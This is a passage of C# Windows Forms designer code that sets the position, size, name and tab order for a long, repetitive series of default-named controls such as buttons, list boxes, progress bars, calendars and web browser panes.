			this.LinkLabel2.AutoSize = true;
			this.LinkLabel2.Location = new Point(115, 37);
			this.LinkLabel2.Name = "LinkLabel2";
			this.LinkLabel2.Size = new Size(59, 13);
			this.LinkLabel2.TabIndex = 7;
			this.LinkLabel2.TabStop = true;
			this.LinkLabel2.Text = "LinkLabel2";
			this.NotifyIcon1.Text = "NotifyIcon1";
			this.NotifyIcon1.Visible = true;
			this.MonthCalendar2.Location = new Point(435, 229);
			this.MonthCalendar2.Name = "MonthCalendar2";
			this.MonthCalendar2.TabIndex = 8;
			this.MonthCalendar3.Location = new Point(108, 106);
			this.MonthCalendar3.Name = "MonthCalendar3";
			this.MonthCalendar3.TabIndex = 9;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Location = new Point(172, 67);
			this.ComboBox1.Name = "ComboBox1";
			this.ComboBox1.Size = new Size(101, 21);
			this.ComboBox1.TabIndex = 10;
			this.CheckedListBox2.FormattingEnabled = true;
			this.CheckedListBox2.Location = new Point(50, 156);
			this.CheckedListBox2.Name = "CheckedListBox2";
			this.CheckedListBox2.Size = new Size(222, 4);
			this.CheckedListBox2.TabIndex = 11;
			this.Button2.Location = new Point(551, 143);
			this.Button2.Name = "Button2";
			this.Button2.Size = new Size(75, 23);
			this.Button2.TabIndex = 12;
			this.Button2.Text = "Button2";
			this.Button2.UseVisualStyleBackColor = true;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Location = new Point(174, 36);
			this.ComboBox2.Name = "ComboBox2";
			this.ComboBox2.Size = new Size(115, 21);
			this.ComboBox2.TabIndex = 13;
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.Location = new Point(183, 75);
			this.CheckBox2.Name = "CheckBox2";
			this.CheckBox2.Size = new Size(81, 17);
			this.CheckBox2.TabIndex = 14;
			this.CheckBox2.Text = "CheckBox2";
			this.CheckBox2.UseVisualStyleBackColor = true;
			this.LinkLabel3.AutoSize = true;
			this.LinkLabel3.Location = new Point(47, 224);
			this.LinkLabel3.Name = "LinkLabel3";
			this.LinkLabel3.Size = new Size(59, 13);
			this.LinkLabel3.TabIndex = 15;
			this.LinkLabel3.TabStop = true;
			this.LinkLabel3.Text = "LinkLabel3";
			this.RadioButton1.AutoSize = true;
			this.RadioButton1.Location = new Point(85, 295);
			this.RadioButton1.Name = "RadioButton1";
			this.RadioButton1.Size = new Size(90, 17);
			this.RadioButton1.TabIndex = 16;
			this.RadioButton1.TabStop = true;
			this.RadioButton1.Text = "RadioButton1";
			this.RadioButton1.UseVisualStyleBackColor = true;
			this.ProgressBar2.Location = new Point(60, 223);
			this.ProgressBar2.Name = "ProgressBar2";
			this.ProgressBar2.Size = new Size(74, 44);
			this.ProgressBar2.TabIndex = 17;
			this.NumericUpDown1.Location = new Point(140, 261);
			this.NumericUpDown1.Name = "NumericUpDown1";
			this.NumericUpDown1.Size = new Size(78, 20);
			this.NumericUpDown1.TabIndex = 18;
			this.PictureBox1.Location = new Point(526, 165);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new Size(166, 43);
			this.PictureBox1.TabIndex = 19;
			this.PictureBox1.TabStop = false;
			this.TreeView1.Location = new Point(229, 174);
			this.TreeView1.Name = "TreeView1";
			this.TreeView1.Size = new Size(183, 112);
			this.TreeView1.TabIndex = 20;
			this.WebBrowser1.Location = new Point(482, 128);
			this.WebBrowser1.MinimumSize = new Size(20, 20);
			this.WebBrowser1.Name = "WebBrowser1";
			this.WebBrowser1.Size = new Size(69, 20);
			this.WebBrowser1.TabIndex = 21;
			this.MaskedTextBox1.Location = new Point(341, 198);
			this.MaskedTextBox1.Name = "MaskedTextBox1";
			this.MaskedTextBox1.Size = new Size(141, 20);
			this.MaskedTextBox1.TabIndex = 22;
			this.PictureBox2.Location = new Point(321, 245);
			this.PictureBox2.Name = "PictureBox2";
			this.PictureBox2.Size = new Size(20, 20);
			this.PictureBox2.TabIndex = 23;
			this.PictureBox2.TabStop = false;
			this.RadioButton2.AutoSize = true;
			this.RadioButton2.Location = new Point(479, 165);
			this.RadioButton2.Name = "RadioButton2";
			this.RadioButton2.Size = new Size(90, 17);
			this.RadioButton2.TabIndex = 24;
			this.RadioButton2.TabStop = true;
			this.RadioButton2.Text = "RadioButton2";
			this.RadioButton2.UseVisualStyleBackColor = true;
			this.MaskedTextBox2.Location = new Point(352, 143);
			this.MaskedTextBox2.Name = "MaskedTextBox2";
			this.MaskedTextBox2.Size = new Size(83, 20);
			this.MaskedTextBox2.TabIndex = 25;
			this.Label1.AutoSize = true;
			this.Label1.Location = new Point(494, 198);
			this.Label1.Name = "Label1";
			this.Label1.Size = new Size(39, 13);
			this.Label1.TabIndex = 26;
			this.Label1.Text = "Label1";
			this.ListBox2.FormattingEnabled = true;
			this.ListBox2.Location = new Point(707, 25);
			this.ListBox2.Name = "ListBox2";
			this.ListBox2.Size = new Size(47, 4);
			this.ListBox2.TabIndex = 27;
			this.DateTimePicker1.Location = new Point(639, 6);
			this.DateTimePicker1.Name = "DateTimePicker1";
			this.DateTimePicker1.Size = new Size(52, 20);
			this.DateTimePicker1.TabIndex = 28;
			this.ListBox3.FormattingEnabled = true;
			this.ListBox3.Location = new Point(689, 94);
			this.ListBox3.Name = "ListBox3";
			this.ListBox3.Size = new Size(49, 69);
			this.ListBox3.TabIndex = 29;
			this.CheckedListBox3.FormattingEnabled = true;
			this.CheckedListBox3.Location = new Point(417, 17);
			this.CheckedListBox3.Name = "CheckedListBox3";
			this.CheckedListBox3.Size = new Size(151, 49);
			this.CheckedListBox3.TabIndex = 30;
			this.DateTimePicker2.Location = new Point(642, 185);
			this.DateTimePicker2.Name = "DateTimePicker2";
			this.DateTimePicker2.Size = new Size(85, 20);
			this.DateTimePicker2.TabIndex = 31;
			this.ProgressBar3.Location = new Point(697, 235);
			this.ProgressBar3.Name = "ProgressBar3";
			this.ProgressBar3.Size = new Size(40, 96);
			this.ProgressBar3.TabIndex = 32;
			this.ProgressBar4.Location = new Point(51, 52);
			this.ProgressBar4.Name = "ProgressBar4";
			this.ProgressBar4.Size = new Size(57, 54);
			this.ProgressBar4.TabIndex = 33;
			this.ProgressBar5.Location = new Point(51, 79);
			this.ProgressBar5.Name = "ProgressBar5";
			this.ProgressBar5.Size = new Size(57, 54);
			this.ProgressBar5.TabIndex = 66;
			this.ProgressBar6.Location = new Point(697, 262);
			this.ProgressBar6.Name = "ProgressBar6";
			this.ProgressBar6.Size = new Size(40, 96);
			this.ProgressBar6.TabIndex = 65;
			this.DateTimePicker3.Location = new Point(642, 212);
			this.DateTimePicker3.Name = "DateTimePicker3";
			this.DateTimePicker3.Size = new Size(85, 20);
			this.DateTimePicker3.TabIndex = 64;
			this.CheckedListBox4.FormattingEnabled = true;
			this.CheckedListBox4.Location = new Point(417, 44);
			this.CheckedListBox4.Name = "CheckedListBox4";
			this.CheckedListBox4.Size = new Size(151, 49);
			this.CheckedListBox4.TabIndex = 63;
			this.ListBox4.FormattingEnabled = true;
			this.ListBox4.Location = new Point(689, 121);
			this.ListBox4.Name = "ListBox4";
			this.ListBox4.Size = new Size(49, 69);
			this.ListBox4.TabIndex = 62;
			this.DateTimePicker4.Location = new Point(639, 33);
			this.DateTimePicker4.Name = "DateTimePicker4";
			this.DateTimePicker4.Size = new Size(52, 20);
			this.DateTimePicker4.TabIndex = 61;
			this.ListBox5.FormattingEnabled = true;
			this.ListBox5.Location = new Point(707, 52);
			this.ListBox5.Name = "ListBox5";
			this.ListBox5.Size = new Size(47, 4);
			this.ListBox5.TabIndex = 60;
			this.Label2.AutoSize = true;
			this.Label2.Location = new Point(494, 225);
			this.Label2.Name = "Label2";
			this.Label2.Size = new Size(39, 13);
			this.Label2.TabIndex = 59;
			this.Label2.Text = "Label2";
			this.MaskedTextBox3.Location = new Point(352, 170);
			this.MaskedTextBox3.Name = "MaskedTextBox3";
			this.MaskedTextBox3.Size = new Size(83, 20);
			this.MaskedTextBox3.TabIndex = 58;
			this.RadioButton3.AutoSize = true;
			this.RadioButton3.Location = new Point(479, 192);
			this.RadioButton3.Name = "RadioButton3";
			this.RadioButton3.Size = new Size(90, 17);
			this.RadioButton3.TabIndex = 57;
			this.RadioButton3.TabStop = true;
			this.RadioButton3.Text = "RadioButton3";
			this.RadioButton3.UseVisualStyleBackColor = true;
			this.PictureBox3.Location = new Point(321, 272);
			this.PictureBox3.Name = "PictureBox3";
			this.PictureBox3.Size = new Size(20, 20);
			this.PictureBox3.TabIndex = 56;
			this.PictureBox3.TabStop = false;
			this.MaskedTextBox4.Location = new Point(341, 225);
			this.MaskedTextBox4.Name = "MaskedTextBox4";
			this.MaskedTextBox4.Size = new Size(141, 20);
			this.MaskedTextBox4.TabIndex = 55;
			this.WebBrowser2.Location = new Point(482, 155);
			this.WebBrowser2.MinimumSize = new Size(20, 20);
			this.WebBrowser2.Name = "WebBrowser2";
			this.WebBrowser2.Size = new Size(69, 20);
			this.WebBrowser2.TabIndex = 54;
			this.TreeView2.Location = new Point(229, 201);
			this.TreeView2.Name = "TreeView2";
			this.TreeView2.Size = new Size(183, 112);
			this.TreeView2.TabIndex = 53;
			this.PictureBox4.Location = new Point(526, 192);
			this.PictureBox4.Name = "PictureBox4";
			this.PictureBox4.Size = new Size(166, 43);
			this.PictureBox4.TabIndex = 52;
			this.PictureBox4.TabStop = false;
			this.NumericUpDown2.Location = new Point(140, 288);
			this.NumericUpDown2.Name = "NumericUpDown2";
			this.NumericUpDown2.Size = new Size(78, 20);
			this.NumericUpDown2.TabIndex = 51;
			this.ProgressBar7.Location = new Point(60, 250);
			this.ProgressBar7.Name = "ProgressBar7";
			this.ProgressBar7.Size = new Size(74, 44);
			this.ProgressBar7.TabIndex = 50;
			this.RadioButton4.AutoSize = true;
			this.RadioButton4.Location = new Point(85, 322);
			this.RadioButton4.Name = "RadioButton4";
			this.RadioButton4.Size = new Size(90, 17);
			this.RadioButton4.TabIndex = 49;
			this.RadioButton4.TabStop = true;
			this.RadioButton4.Text = "RadioButton4";
			this.RadioButton4.UseVisualStyleBackColor = true;
			this.LinkLabel4.AutoSize = true;
			this.LinkLabel4.Location = new Point(47, 251);
			this.LinkLabel4.Name = "LinkLabel4";
			this.LinkLabel4.Size = new Size(59, 13);
			this.LinkLabel4.TabIndex = 48;
			this.LinkLabel4.TabStop = true;
			this.LinkLabel4.Text = "LinkLabel4";
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Location = new Point(183, 102);
			this.CheckBox3.Name = "CheckBox3";
			this.CheckBox3.Size = new Size(81, 17);
			this.CheckBox3.TabIndex = 47;
			this.CheckBox3.Text = "CheckBox3";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.ComboBox3.FormattingEnabled = true;
			this.ComboBox3.Location = new Point(174, 63);
			this.ComboBox3.Name = "ComboBox3";
			this.ComboBox3.Size = new Size(115, 21);
			this.ComboBox3.TabIndex = 46;
			this.Button3.Location = new Point(551, 170);
			this.Button3.Name = "Button3";
			this.Button3.Size = new Size(75, 23);
			this.Button3.TabIndex = 45;
			this.Button3.Text = "Button3";
			this.Button3.UseVisualStyleBackColor = true;
			this.CheckedListBox5.FormattingEnabled = true;
			this.CheckedListBox5.Location = new Point(50, 183);
			this.CheckedListBox5.Name = "CheckedListBox5";
			this.CheckedListBox5.Size = new Size(222, 4);
			this.CheckedListBox5.TabIndex = 44;
			this.ComboBox4.FormattingEnabled = true;
			this.ComboBox4.Location = new Point(172, 94);
			this.ComboBox4.Name = "ComboBox4";
			this.ComboBox4.Size = new Size(101, 21);
			this.ComboBox4.TabIndex = 43;
			this.MonthCalendar4.Location = new Point(108, 133);
			this.MonthCalendar4.Name = "MonthCalendar4";
			this.MonthCalendar4.TabIndex = 42;
			this.MonthCalendar5.Location = new Point(435, 256);
			this.MonthCalendar5.Name = "MonthCalendar5";
			this.MonthCalendar5.TabIndex = 41;
			this.LinkLabel5.AutoSize = true;
			this.LinkLabel5.Location = new Point(115, 64);
			this.LinkLabel5.Name = "LinkLabel5";
			this.LinkLabel5.Size = new Size(59, 13);
			this.LinkLabel5.TabIndex = 40;
			this.LinkLabel5.TabStop = true;
			this.LinkLabel5.Text = "LinkLabel5";
			this.ProgressBar8.Location = new Point(86, 152);
			this.ProgressBar8.Name = "ProgressBar8";
			this.ProgressBar8.Size = new Size(93, 107);
			this.ProgressBar8.TabIndex = 39;
			this.LinkLabel6.AutoSize = true;
			this.LinkLabel6.Location = new Point(466, 238);
			this.LinkLabel6.Name = "LinkLabel6";
			this.LinkLabel6.Size = new Size(59, 13);
			this.LinkLabel6.TabIndex = 38;
			this.LinkLabel6.TabStop = true;
			this.LinkLabel6.Text = "LinkLabel6";
			this.ListBox6.FormattingEnabled = true;
			this.ListBox6.Location = new Point(273, 303);
			this.ListBox6.Name = "ListBox6";
			this.ListBox6.Size = new Size(165, 69);
			this.ListBox6.TabIndex = 37;
			this.CheckBox4.AutoSize = true;
			this.CheckBox4.Location = new Point(163, 272);
			this.CheckBox4.Name = "CheckBox4";
			this.CheckBox4.Size = new Size(81, 17);
			this.CheckBox4.TabIndex = 36;
			this.CheckBox4.Text = "CheckBox4";
			this.CheckBox4.UseVisualStyleBackColor = true;
			this.CheckedListBox6.FormattingEnabled = true;
			this.CheckedListBox6.Location = new Point(324, 107);
			this.CheckedListBox6.Name = "CheckedListBox6";
			this.CheckedListBox6.Size = new Size(303, 49);
			this.CheckedListBox6.TabIndex = 35;
			this.Button4.Location = new Point(242, 152);
			this.Button4.Name = "Button4";
			this.Button4.Size = new Size(156, 50);
			this.Button4.TabIndex = 34;
			this.Button4.Text = "Button4";
			this.Button4.UseVisualStyleBackColor = true;
			this.ProgressBar9.Location = new Point(59, 87);
			this.ProgressBar9.Name = "ProgressBar9";
			this.ProgressBar9.Size = new Size(57, 54);
			this.ProgressBar9.TabIndex = 99;
			this.ProgressBar10.Location = new Point(705, 270);
			this.ProgressBar10.Name = "ProgressBar10";
			this.ProgressBar10.Size = new Size(40, 96);
			this.ProgressBar10.TabIndex = 98;
			this.DateTimePicker5.Location = new Point(650, 220);
			this.DateTimePicker5.Name = "DateTimePicker5";
			this.DateTimePicker5.Size = new Size(85, 20);
			this.DateTimePicker5.TabIndex = 97;
			this.CheckedListBox7.FormattingEnabled = true;
			this.CheckedListBox7.Location = new Point(425, 52);
			this.CheckedListBox7.Name = "CheckedListBox7";
			this.CheckedListBox7.Size = new Size(151, 49);
			this.CheckedListBox7.TabIndex = 96;
			this.ListBox7.FormattingEnabled = true;
			this.ListBox7.Location = new Point(697, 129);
			this.ListBox7.Name = "ListBox7";
			this.ListBox7.Size = new Size(49, 69);
			this.ListBox7.TabIndex = 95;
			this.DateTimePicker6.Location = new Point(647, 41);
			this.DateTimePicker6.Name = "DateTimePicker6";
			this.DateTimePicker6.Size = new Size(52, 20);
			this.DateTimePicker6.TabIndex = 94;
			this.ListBox8.FormattingEnabled = true;
			this.ListBox8.Location = new Point(715, 60);
			this.ListBox8.Name = "ListBox8";
			this.ListBox8.Size = new Size(47, 4);
			this.ListBox8.TabIndex = 93;
			this.Label3.AutoSize = true;
			this.Label3.Location = new Point(502, 233);
			this.Label3.Name = "Label3";
			this.Label3.Size = new Size(39, 13);
			this.Label3.TabIndex = 92;
			this.Label3.Text = "Label3";
			this.MaskedTextBox5.Location = new Point(360, 178);
			this.MaskedTextBox5.Name = "MaskedTextBox5";
			this.MaskedTextBox5.Size = new Size(83, 20);
			this.MaskedTextBox5.TabIndex = 91;
			this.RadioButton5.AutoSize = true;
			this.RadioButton5.Location = new Point(487, 200);
			this.RadioButton5.Name = "RadioButton5";
			this.RadioButton5.Size = new Size(90, 17);
			this.RadioButton5.TabIndex = 90;
			this.RadioButton5.TabStop = true;
			this.RadioButton5.Text = "RadioButton5";
			this.RadioButton5.UseVisualStyleBackColor = true;
			this.PictureBox5.Location = new Point(329, 280);
			this.PictureBox5.Name = "PictureBox5";
			this.PictureBox5.Size = new Size(20, 20);
			this.PictureBox5.TabIndex = 89;
			this.PictureBox5.TabStop = false;
			this.MaskedTextBox6.Location = new Point(349, 233);
			this.MaskedTextBox6.Name = "MaskedTextBox6";
			this.MaskedTextBox6.Size = new Size(141, 20);
			this.MaskedTextBox6.TabIndex = 88;
			this.WebBrowser3.Location = new Point(490, 163);
			this.WebBrowser3.MinimumSize = new Size(20, 20);
			this.WebBrowser3.Name = "WebBrowser3";
			this.WebBrowser3.Size = new Size(69, 20);
			this.WebBrowser3.TabIndex = 87;
			this.TreeView3.Location = new Point(237, 209);
			this.TreeView3.Name = "TreeView3";
			this.TreeView3.Size = new Size(183, 112);
			this.TreeView3.TabIndex = 86;
			this.PictureBox6.Location = new Point(534, 200);
			this.PictureBox6.Name = "PictureBox6";
			this.PictureBox6.Size = new Size(166, 43);
			this.PictureBox6.TabIndex = 85;
			this.PictureBox6.TabStop = false;
			this.NumericUpDown3.Location = new Point(148, 296);
			this.NumericUpDown3.Name = "NumericUpDown3";
			this.NumericUpDown3.Size = new Size(78, 20);
			this.NumericUpDown3.TabIndex = 84;
			this.ProgressBar11.Location = new Point(68, 258);
			this.ProgressBar11.Name = "ProgressBar11";
			this.ProgressBar11.Size = new Size(74, 44);
			this.ProgressBar11.TabIndex = 83;
			this.RadioButton6.AutoSize = true;
			this.RadioButton6.Location = new Point(93, 330);
			this.RadioButton6.Name = "RadioButton6";
			this.RadioButton6.Size = new Size(90, 17);
			this.RadioButton6.TabIndex = 82;
			this.RadioButton6.TabStop = true;
			this.RadioButton6.Text = "RadioButton6";
			this.RadioButton6.UseVisualStyleBackColor = true;
			this.LinkLabel7.AutoSize = true;
			this.LinkLabel7.Location = new Point(55, 259);
			this.LinkLabel7.Name = "LinkLabel7";
			this.LinkLabel7.Size = new Size(59, 13);
			this.LinkLabel7.TabIndex = 81;
			this.LinkLabel7.TabStop = true;
			this.LinkLabel7.Text = "LinkLabel7";
			this.CheckBox5.AutoSize = true;
			this.CheckBox5.Location = new Point(191, 110);
			this.CheckBox5.Name = "CheckBox5";
			this.CheckBox5.Size = new Size(81, 17);
			this.CheckBox5.TabIndex = 80;
			this.CheckBox5.Text = "CheckBox5";
			this.CheckBox5.UseVisualStyleBackColor = true;
			this.ComboBox5.FormattingEnabled = true;
			this.ComboBox5.Location = new Point(182, 71);
			this.ComboBox5.Name = "ComboBox5";
			this.ComboBox5.Size = new Size(115, 21);
			this.ComboBox5.TabIndex = 79;
			this.Button5.Location = new Point(559, 178);
			this.Button5.Name = "Button5";
			this.Button5.Size = new Size(75, 23);
			this.Button5.TabIndex = 78;
			this.Button5.Text = "Button5";
			this.Button5.UseVisualStyleBackColor = true;
			this.CheckedListBox8.FormattingEnabled = true;
			this.CheckedListBox8.Location = new Point(58, 191);
			this.CheckedListBox8.Name = "CheckedListBox8";
			this.CheckedListBox8.Size = new Size(222, 4);
			this.CheckedListBox8.TabIndex = 77;
			this.ComboBox6.FormattingEnabled = true;
			this.ComboBox6.Location = new Point(180, 102);
			this.ComboBox6.Name = "ComboBox6";
			this.ComboBox6.Size = new Size(101, 21);
			this.ComboBox6.TabIndex = 76;
			this.MonthCalendar6.Location = new Point(116, 141);
			this.MonthCalendar6.Name = "MonthCalendar6";
			this.MonthCalendar6.TabIndex = 75;
			this.MonthCalendar7.Location = new Point(443, 264);
			this.MonthCalendar7.Name = "MonthCalendar7";
			this.MonthCalendar7.TabIndex = 74;
			this.LinkLabel8.AutoSize = true;
			this.LinkLabel8.Location = new Point(123, 72);
			this.LinkLabel8.Name = "LinkLabel8";
			this.LinkLabel8.Size = new Size(59, 13);
			this.LinkLabel8.TabIndex = 73;
			this.LinkLabel8.TabStop = true;
			this.LinkLabel8.Text = "LinkLabel8";
			this.ProgressBar12.Location = new Point(94, 160);
			this.ProgressBar12.Name = "ProgressBar12";
			this.ProgressBar12.Size = new Size(93, 107);
			this.ProgressBar12.TabIndex = 72;
			this.LinkLabel9.AutoSize = true;
			this.LinkLabel9.Location = new Point(474, 246);
			this.LinkLabel9.Name = "LinkLabel9";
			this.LinkLabel9.Size = new Size(59, 13);
			this.LinkLabel9.TabIndex = 71;
			this.LinkLabel9.TabStop = true;
			this.LinkLabel9.Text = "LinkLabel9";
			this.ListBox9.FormattingEnabled = true;
			this.ListBox9.Location = new Point(281, 311);
			this.ListBox9.Name = "ListBox9";
			this.ListBox9.Size = new Size(165, 69);
			this.ListBox9.TabIndex = 70;
			this.CheckBox6.AutoSize = true;
			this.CheckBox6.Location = new Point(171, 280);
			this.CheckBox6.Name = "CheckBox6";
			this.CheckBox6.Size = new Size(81, 17);
			this.CheckBox6.TabIndex = 69;
			this.CheckBox6.Text = "CheckBox6";
			this.CheckBox6.UseVisualStyleBackColor = true;
			this.CheckedListBox9.FormattingEnabled = true;
			this.CheckedListBox9.Location = new Point(332, 115);
			this.CheckedListBox9.Name = "CheckedListBox9";
			this.CheckedListBox9.Size = new Size(303, 49);
			this.CheckedListBox9.TabIndex = 68;
			this.Button6.Location = new Point(250, 160);
			this.Button6.Name = "Button6";
			this.Button6.Size = new Size(156, 50);
			this.Button6.TabIndex = 67;
			this.Button6.Text = "Button6";
			this.Button6.UseVisualStyleBackColor = true;
			this.ProgressBar13.Location = new Point(67, 95);
			this.ProgressBar13.Name = "ProgressBar13";
			this.ProgressBar13.Size = new Size(57, 54);
			this.ProgressBar13.TabIndex = 132;
			this.ProgressBar14.Location = new Point(713, 278);
			this.ProgressBar14.Name = "ProgressBar14";
			this.ProgressBar14.Size = new Size(40, 96);
			this.ProgressBar14.TabIndex = 131;
			this.DateTimePicker7.Location = new Point(658, 228);
			this.DateTimePicker7.Name = "DateTimePicker7";
			this.DateTimePicker7.Size = new Size(85, 20);
			this.DateTimePicker7.TabIndex = 130;
			this.CheckedListBox10.FormattingEnabled = true;
			this.CheckedListBox10.Location = new Point(433, 60);
			this.CheckedListBox10.Name = "CheckedListBox10";
			this.CheckedListBox10.Size = new Size(151, 49);
			this.CheckedListBox10.TabIndex = 129;
			this.ListBox10.FormattingEnabled = true;
			this.ListBox10.Location = new Point(705, 137);
			this.ListBox10.Name = "ListBox10";
			this.ListBox10.Size = new Size(49, 69);
			this.ListBox10.TabIndex = 128;
			this.DateTimePicker8.Location = new Point(655, 49);
			this.DateTimePicker8.Name = "DateTimePicker8";
			this.DateTimePicker8.Size = new Size(52, 20);
			this.DateTimePicker8.TabIndex = 127;
			this.ListBox11.FormattingEnabled = true;
			this.ListBox11.Location = new Point(723, 68);
			this.ListBox11.Name = "ListBox11";
			this.ListBox11.Size = new Size(47, 4);
			this.ListBox11.TabIndex = 126;
			this.Label4.AutoSize = true;
			this.Label4.Location = new Point(510, 241);
			this.Label4.Name = "Label4";
			this.Label4.Size = new Size(39, 13);
			this.Label4.TabIndex = 125;
			this.Label4.Text = "Label4";
			this.MaskedTextBox7.Location = new Point(368, 186);
			this.MaskedTextBox7.Name = "MaskedTextBox7";
			this.MaskedTextBox7.Size = new Size(83, 20);
			this.MaskedTextBox7.TabIndex = 124;
			this.RadioButton7.AutoSize = true;
			this.RadioButton7.Location = new Point(495, 208);
			this.RadioButton7.Name = "RadioButton7";
			this.RadioButton7.Size = new Size(90, 17);
			this.RadioButton7.TabIndex = 123;
			this.RadioButton7.TabStop = true;
			this.RadioButton7.Text = "RadioButton7";
			this.RadioButton7.UseVisualStyleBackColor = true;
			this.PictureBox7.Location = new Point(337, 288);
			this.PictureBox7.Name = "PictureBox7";
			this.PictureBox7.Size = new Size(20, 20);
			this.PictureBox7.TabIndex = 122;
			this.PictureBox7.TabStop = false;
			this.MaskedTextBox8.Location = new Point(357, 241);
			this.MaskedTextBox8.Name = "MaskedTextBox8";
			this.MaskedTextBox8.Size = new Size(141, 20);
			this.MaskedTextBox8.TabIndex = 121;
			this.WebBrowser4.Location = new Point(498, 171);
			this.WebBrowser4.MinimumSize = new Size(20, 20);
			this.WebBrowser4.Name = "WebBrowser4";
			this.WebBrowser4.Size = new Size(69, 20);
			this.WebBrowser4.TabIndex = 120;
			this.TreeView4.Location = new Point(245, 217);
			this.TreeView4.Name = "TreeView4";
			this.TreeView4.Size = new Size(183, 112);
			this.TreeView4.TabIndex = 119;
			this.PictureBox8.Location = new Point(542, 208);
			this.PictureBox8.Name = "PictureBox8";
			this.PictureBox8.Size = new Size(166, 43);
			this.PictureBox8.TabIndex = 118;
			this.PictureBox8.TabStop = false;
			this.NumericUpDown4.Location = new Point(156, 304);
			this.NumericUpDown4.Name = "NumericUpDown4";
			this.NumericUpDown4.Size = new Size(78, 20);
			this.NumericUpDown4.TabIndex = 117;
			this.ProgressBar15.Location = new Point(76, 266);
			this.ProgressBar15.Name = "ProgressBar15";
			this.ProgressBar15.Size = new Size(74, 44);
			this.ProgressBar15.TabIndex = 116;
			this.RadioButton8.AutoSize = true;
			this.RadioButton8.Location = new Point(101, 338);
			this.RadioButton8.Name = "RadioButton8";
			this.RadioButton8.Size = new Size(90, 17);
			this.RadioButton8.TabIndex = 115;
			this.RadioButton8.TabStop = true;
			this.RadioButton8.Text = "RadioButton8";
			this.RadioButton8.UseVisualStyleBackColor = true;
			this.LinkLabel10.AutoSize = true;
			this.LinkLabel10.Location = new Point(63, 267);
			this.LinkLabel10.Name = "LinkLabel10";
			this.LinkLabel10.Size = new Size(65, 13);
			this.LinkLabel10.TabIndex = 114;
			this.LinkLabel10.TabStop = true;
			this.LinkLabel10.Text = "LinkLabel10";
			this.CheckBox7.AutoSize = true;
			this.CheckBox7.Location = new Point(199, 118);
			this.CheckBox7.Name = "CheckBox7";
			this.CheckBox7.Size = new Size(81, 17);
			this.CheckBox7.TabIndex = 113;
			this.CheckBox7.Text = "CheckBox7";
			this.CheckBox7.UseVisualStyleBackColor = true;
			this.ComboBox7.FormattingEnabled = true;
			this.ComboBox7.Location = new Point(190, 79);
			this.ComboBox7.Name = "ComboBox7";
			this.ComboBox7.Size = new Size(115, 21);
			this.ComboBox7.TabIndex = 112;
			this.Button7.Location = new Point(567, 186);
			this.Button7.Name = "Button7";
			this.Button7.Size = new Size(75, 23);
			this.Button7.TabIndex = 111;
			this.Button7.Text = "Button7";
			this.Button7.UseVisualStyleBackColor = true;
			this.CheckedListBox11.FormattingEnabled = true;
			this.CheckedListBox11.Location = new Point(66, 199);
			this.CheckedListBox11.Name = "CheckedListBox11";
			this.CheckedListBox11.Size = new Size(222, 4);
			this.CheckedListBox11.TabIndex = 110;
			this.ComboBox8.FormattingEnabled = true;
			this.ComboBox8.Location = new Point(188, 110);
			this.ComboBox8.Name = "ComboBox8";
			this.ComboBox8.Size = new Size(101, 21);
			this.ComboBox8.TabIndex = 109;
			this.MonthCalendar8.Location = new Point(124, 149);
			this.MonthCalendar8.Name = "MonthCalendar8";
			this.MonthCalendar8.TabIndex = 108;
			this.MonthCalendar9.Location = new Point(451, 272);
			this.MonthCalendar9.Name = "MonthCalendar9";
			this.MonthCalendar9.TabIndex = 107;
			this.LinkLabel11.AutoSize = true;
			this.LinkLabel11.Location = new Point(131, 80);
			this.LinkLabel11.Name = "LinkLabel11";
			this.LinkLabel11.Size = new Size(65, 13);
			this.LinkLabel11.TabIndex = 106;
			this.LinkLabel11.TabStop = true;
			this.LinkLabel11.Text = "LinkLabel11";
			this.ProgressBar16.Location = new Point(102, 168);
			this.ProgressBar16.Name = "ProgressBar16";
			this.ProgressBar16.Size = new Size(93, 107);
			this.ProgressBar16.TabIndex = 105;
			this.LinkLabel12.AutoSize = true;
			this.LinkLabel12.Location = new Point(482, 254);
			this.LinkLabel12.Name = "LinkLabel12";
			this.LinkLabel12.Size = new Size(65, 13);
			this.LinkLabel12.TabIndex = 104;
			this.LinkLabel12.TabStop = true;
			this.LinkLabel12.Text = "LinkLabel12";
			this.ListBox12.FormattingEnabled = true;
			this.ListBox12.Location = new Point(289, 319);
			this.ListBox12.Name = "ListBox12";
			this.ListBox12.Size = new Size(165, 69);
			this.ListBox12.TabIndex = 103;
			this.CheckBox8.AutoSize = true;
			this.CheckBox8.Location = new Point(179, 288);
			this.CheckBox8.Name = "CheckBox8";
			this.CheckBox8.Size = new Size(81, 17);
			this.CheckBox8.TabIndex = 102;
			this.CheckBox8.Text = "CheckBox8";
			this.CheckBox8.UseVisualStyleBackColor = true;
			this.CheckedListBox12.FormattingEnabled = true;
			this.CheckedListBox12.Location = new Point(340, 123);
			this.CheckedListBox12.Name = "CheckedListBox12";
			this.CheckedListBox12.Size = new Size(303, 49);
			this.CheckedListBox12.TabIndex = 101;
			this.Button8.Location = new Point(258, 168);
			this.Button8.Name = "Button8";
			this.Button8.Size = new Size(156, 50);
			this.Button8.TabIndex = 100;
			this.Button8.Text = "Button8";
			this.Button8.UseVisualStyleBackColor = true;
			this.ProgressBar17.Location = new Point(75, 103);
			this.ProgressBar17.Name = "ProgressBar17";
			this.ProgressBar17.Size = new Size(57, 54);
			this.ProgressBar17.TabIndex = 165;
			this.ProgressBar18.Location = new Point(721, 286);
			this.ProgressBar18.Name = "ProgressBar18";
			this.ProgressBar18.Size = new Size(40, 96);
			this.ProgressBar18.TabIndex = 164;
			this.DateTimePicker9.Location = new Point(666, 236);
			this.DateTimePicker9.Name = "DateTimePicker9";
			this.DateTimePicker9.Size = new Size(85, 20);
			this.DateTimePicker9.TabIndex = 163;
			this.CheckedListBox13.FormattingEnabled = true;
			this.CheckedListBox13.Location = new Point(441, 68);
			this.CheckedListBox13.Name = "CheckedListBox13";
			this.CheckedListBox13.Size = new Size(151, 49);
			this.CheckedListBox13.TabIndex = 162;
			this.ListBox13.FormattingEnabled = true;
			this.ListBox13.Location = new Point(713, 145);
			this.ListBox13.Name = "ListBox13";
			this.ListBox13.Size = new Size(49, 69);
			this.ListBox13.TabIndex = 161;
			this.DateTimePicker10.Location = new Point(663, 57);
